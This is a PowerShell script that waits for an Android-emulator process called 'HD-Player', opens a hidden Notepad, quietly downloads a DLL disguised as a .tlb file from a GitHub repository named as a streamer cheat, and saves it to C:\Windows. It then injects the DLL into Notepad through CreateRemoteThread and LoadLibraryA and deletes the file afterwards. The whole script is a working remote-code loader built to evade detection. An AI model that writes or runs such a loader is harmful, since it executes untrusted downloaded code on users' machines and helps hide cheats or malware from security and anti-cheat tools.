# === Constants ===
$PROCESS_ALL_ACCESS = 0x1F0FFF
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_READWRITE = 0x04
$dllUrl = "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/ShellJector.tlb"
$dllPath = "C:\Windows\ShellJector.tlb"
$prevHdPlayerRunning = $false

# === Win32 API declarations ===
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
}
"@

# === Monitoring Loop ===
while ($true) {
    # Check if HD-Player is running
    $hdProcess = Get-Process -Name "HD-Player" -ErrorAction SilentlyContinue
    $hdPlayerRunning = $hdProcess -ne $null

    # Run only if it just started (was not running before)
    if ($hdPlayerRunning -and -not $prevHdPlayerRunning) {
        Write-Host "[+] HD-Player detected. Injecting once..."

        # Step 1: Start notepad hidden
        $notepadProcess = Start-Process -FilePath "notepad.exe" -WindowStyle Hidden -PassThru
        Start-Sleep -Milliseconds 500

        # Step 2: Download DLL silently
        try {
            Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
        } catch {
            Write-Host "[-] DLL download failed: $($_.Exception.Message)"
            $prevHdPlayerRunning = $true
            Start-Sleep -Seconds 2
            continue
        }

        # Step 3: Inject DLL into Notepad
        $processId = $notepadProcess.Id
        $hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $processId)

        if ($hProcess -ne [IntPtr]::Zero) {
            $dllBytes = [System.Text.Encoding]::ASCII.GetBytes($dllPath + [char]0)
            $allocMem = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $dllBytes.Length, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_READWRITE)

            if ($allocMem -ne [IntPtr]::Zero) {
                $outSize = [IntPtr]::Zero
                $writeResult = [Win32]::WriteProcessMemory($hProcess, $allocMem, $dllBytes, $dllBytes.Length, [ref]$outSize)

                if ($writeResult) {
                    $hKernel32 = [Win32]::GetModuleHandle("kernel32.dll")
                    $loadLibraryAddr = [Win32]::GetProcAddress($hKernel32, "LoadLibraryA")

                    if ($loadLibraryAddr -ne [IntPtr]::Zero) {
                        $threadId = [IntPtr]::Zero
                        [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $allocMem, 0, [ref]$threadId) | Out-Null
                        Write-Host "[+] DLL injected successfully."
                    }
                }
            }
        }

        # Step 4: Wait and cleanup
        Start-Sleep -Seconds 2
        try { Remove-Item $dllPath -Force -ErrorAction SilentlyContinue } catch {}
    }

    # Update status for next loop
    $prevHdPlayerRunning = $hdPlayerRunning

    # Loop delay
    Start-Sleep -Seconds 2
}
